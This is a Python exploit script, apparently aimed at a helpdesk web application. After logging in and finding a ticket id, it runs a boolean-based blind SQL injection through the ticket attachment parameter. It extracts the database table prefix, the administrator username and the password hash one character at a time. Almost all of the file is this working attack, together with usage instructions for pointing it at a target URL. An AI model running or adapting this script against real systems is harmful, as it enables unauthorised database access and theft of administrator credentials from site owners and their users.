import requests
import sys
import string

if len(sys.argv) < 3:
    print("put proper data like in example, remember to open a ticket before.... ")
    print(
        "python helpdesk.py http://192.168.43.162/helpdesk/ myemailtologin@gmail.com password123"
    )
    exit()
EMAIL = sys.argv[2]
PASSWORD = sys.argv[3]

URL = sys.argv[1]


def get_token(content):
    token = content.decode("utf-8")
    if "csrfhash" not in token:
        return "error"
    token = token[token.find('csrfhash" value="') : len(token)]
    if '" />' in token:
        token = token[token.find('value="') + 7 : token.find('" />')]
    else:
        token = token[token.find('value="') + 7 : token.find('"/>')]
    return token


def get_ticket_id(content):
    ticketid = content.decode("utf-8")
    if "param[]=" not in ticketid:
        return "error"
    ticketid = ticketid[ticketid.find("param[]=") : len(ticketid)]
    ticketid = ticketid[8 : ticketid.find('"')]
    return ticketid


def main():

    # Start a session so we can have persistant cookies
    session = requests.session()

    r = session.get(URL + "")

    # GET THE TOKEN TO LOGIN
    TOKEN = get_token(r.content)
    if TOKEN == "error":
        print("cannot find token")
        exit()
        # Data for login
    login_data = {
        "do": "login",
        "csrfhash": TOKEN,
        "email": EMAIL,
        "password": PASSWORD,
        "btn": "Login",
    }

    # Authenticate
    r = session.post(URL + "/?v=login", data=login_data)
    # GET  ticketid
    ticket_id = get_ticket_id(r.content)
    if ticket_id == "error":
        print("ticketid not found, open a ticket first")
        exit()
    print("ticketID found")
    # + "&param[]=attachment&param[]=1&param[]=1"
    target = (
        URL
        + "?v=view_tickets&action=ticket&param[]="
        + ticket_id
        + "&param[]=attachment&param[]=1&param[]=6"
    )

    print(target)

    chars = list(string.ascii_lowercase) + list(string.digits)

    # Loop to find table prefix
    table_prefix = []
    k = 1
    while k <= 40:
        found = False
        for i in chars:
            target_prefix = (
                target
                + " or 1=1 and ascii(substr((SeLeCt table_name from information_schema.columns where table_name like '%staff'  limit 0,1),{},1)) = '{}' -- -".format(k, i)
            )
            response = session.get(target_prefix).content
            if "t find what you were looking for" not in response.decode("utf-8"):
                table_prefix.append(i)
                k += 1
                found = True
                break
        if not found:
            break
    
    table_prefix = "".join(table_prefix)
    table_prefix = table_prefix[0 : table_prefix.find("staff")]
    print("Table prefix: ", table_prefix)

    # Loop to find admin username
    admin_u = []
    k = 1
    while k <= 40:
        found = False
        for i in chars:
            target_username = (
                target
                + " and substr((SeLeCt username from "
                + table_prefix
                + "staff limit 0,1),{},1) = '{}' -- -".format(k, i)
            )
            response = session.get(target_username).content
            if "t find what you were looking for" not in response.decode("utf-8"):
                admin_u.append(i)
                found = True
                break
        if not found:
            break
        k += 1

    admin_username = "".join(admin_u)
    print("username: " + admin_username)

    # Loop to find Password
    admin_pw = []
    k = 1
    while k <= 40:
        found = False
        for i in chars:
            target_password = (
                target
                + " and substr((SeLeCt password from "
                + table_prefix
                + "staff limit 0,1),{},1) = '{}' -- -".format(k, i)
            )
            response = session.get(target_password).content
            if "t find what you were looking for" not in response.decode("utf-8"):
                admin_pw.append(i)
                print('Password: ' + ''.join(admin_pw))
                found = True
                break
        if not found:
            break
        k += 1

    admin_password = "".join(admin_pw)
    print("password: " + admin_password)

    print("------------------------------------------")
    print(("username: " + admin_username))
    print(("password: sha256(" + admin_password + ")"))
    if admin_username == "" and admin_password == "":
        print(
            "Your ticket have to include attachment, probably none atachments found, or prefix is not equal hdz_"
        )
        print("try to submit ticket with attachment")


if __name__ == "__main__":
    main()
